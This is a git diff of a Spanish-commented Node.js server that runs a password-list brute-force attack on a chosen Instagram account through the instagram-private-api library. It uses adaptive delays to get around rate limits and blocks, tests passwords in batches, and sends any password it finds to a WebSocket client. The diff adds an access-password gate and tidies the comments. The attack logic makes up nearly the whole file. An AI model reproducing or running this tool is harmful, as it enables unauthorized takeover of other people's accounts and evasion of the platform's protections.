@@ -7,19 +7,20 @@ const app = express();
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Configuración de velocidad
+// Configuración
 const CONFIG = {
   ACCESS_PASSWORD: process.env.ACCESS_PASSWORD || 'error404notfoundÑ',
-  DELAY_NORMAL: 1500,       // 1.5s entre intentos normales
-  DELAY_AFTER_FAIL: 3000,   // 3s después de un fallo
-  DELAY_CRITICAL: 10000,    // 10s para errores críticos
-  BATCH_SIZE: 3,            // Procesar 3 contraseñas por lote
+  DELAY_NORMAL: 1500,
+  DELAY_AFTER_FAIL: 3000,
+  DELAY_CRITICAL: 10000,
+  BATCH_SIZE: 3,
   PORT: process.env.PORT || 8080
 };
 
-console.log(`[⚡] Servidor turbo iniciado. Puerto: ${CONFIG.PORT}`);
+// Función de delay
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Técnica de delay adaptable
+// Delay adaptable
 const smartDelay = (lastError) => {
   if (!lastError) return delay(CONFIG.DELAY_NORMAL);
   if (lastError.includes('limit') || lastError.includes('blocked')) {
@@ -28,8 +29,8 @@ const smartDelay = (lastError) => {
   return delay(CONFIG.DELAY_AFTER_FAIL);
 };
 
-// Procesamiento por lotes para mayor velocidad
-async function processBatch(username, passwords, ws) {
+// Procesamiento por lotes
+async function processBatch(username, passwords) {
   const ig = new IgApiClient();
   ig.state.generateDevice(username);
   
@@ -38,7 +39,7 @@ async function processBatch(username, passwords, ws) {
   for (const password of passwords) {
     try {
       await ig.simulate.preLoginFlow();
-      await delay(500); // Mini delay entre pasos
+      await delay(500);
       
       const auth = await ig.account.login(username, password);
       
@@ -48,9 +49,8 @@ async function processBatch(username, passwords, ws) {
     } catch (error) {
       lastError = error.message;
       
-      // Detección rápida de errores críticos
       if (error.message.includes('challenge_required')) {
-        return { success: false, message: 'Verificación manual requerida' };
+        return { success: false, message: 'Desafío de seguridad detectado. Se requiere verificación manual.' };
       }
     } finally {
       await smartDelay(lastError);
@@ -59,41 +59,62 @@ async function processBatch(username, passwords, ws) {
   return { success: false };
 }
 
-// Conexión WebSocket optimizada
+// Servir archivos estáticos
+app.use(express.static('public'));
+
+// WebSocket
 wss.on('connection', (ws) => {
-  console.log('[🔌] Conexión establecida');
+  console.log('Nueva conexión WebSocket');
 
   ws.on('message', async (message) => {
     const data = JSON.parse(message);
     
-    if (data.type === 'startLogin') {
-      const { username, passwords } = data;
-      
-      // Procesar por lotes
-      for (let i = 0; i < passwords.length; i += CONFIG.BATCH_SIZE) {
-        const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
-        const result = await processBatch(username, batch, ws);
-        
-        if (result.success) {
-          ws.send(JSON.stringify({ 
-            type: 'success', 
-            password: result.password,
-            stats: { tested: i + batch.length, total: passwords.length }
-          }));
-          return;
-        }
-        
-        ws.send(JSON.stringify({
-          type: 'progress',
-          progress: { current: i + batch.length, total: passwords.length }
+    // Verificar contraseña de acceso
+    if (data.type === 'verifyAccessPassword') {
+      if (data.password === CONFIG.ACCESS_PASSWORD) {
+        ws.send(JSON.stringify({ type: 'accessGranted' }));
+      } else {
+        ws.send(JSON.stringify({ 
+          type: 'accessDenied', 
+          message: 'Contraseña de acceso incorrecta' 
         }));
       }
+      return;
+    }
+    
+    // Procesar inicio de sesión
+    if (data.type === 'startLogin') {
+      const { username, passwords } = data;
+      const total = passwords.length;
       
-      ws.send(JSON.stringify({ type: 'completed', success: false }));
+      for (let i = 0; i < total; i += CONFIG.BATCH_SIZE) {
+        const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
+        const result = await processBatch(username, batch);
+        
+        ws.send(JSON.stringify({
+          progress: { current: Math.min(i + CONFIG.BATCH_SIZE, total), total },
+          ...result
+        }));
+        
+        if (result.success) {
+          return ws.send(JSON.stringify({ 
+            type: 'finished',
+            success: true,
+            message: `¡Éxito! Contraseña encontrada: ${result.password}`,
+            password: result.password
+          }));
+        }
+      }
+      
+      ws.send(JSON.stringify({ 
+        type: 'finished',
+        success: false,
+        message: 'No se encontró la contraseña en la lista proporcionada'
+      }));
     }
   });
 });
 
 server.listen(CONFIG.PORT, () => {
-  console.log(`[🚀] Servidor listo en http://localhost:${CONFIG.PORT}`);
+  console.log(`Servidor iniciado en http://localhost:${CONFIG.PORT}`);
 });
